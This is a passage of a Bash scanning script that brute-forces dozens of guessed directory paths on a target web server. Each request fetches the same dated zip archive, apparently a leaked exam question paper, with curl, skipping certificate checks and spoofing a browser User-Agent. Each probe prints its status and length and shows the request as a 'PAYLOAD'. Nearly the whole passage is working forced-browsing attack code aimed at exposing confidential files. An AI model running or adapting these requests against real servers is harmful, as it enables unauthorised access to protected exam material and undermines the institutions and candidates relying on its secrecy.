${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtMassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineQPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PCloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFilePortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFilePortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFilePortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PortalQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PortalQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PortalQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PFileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
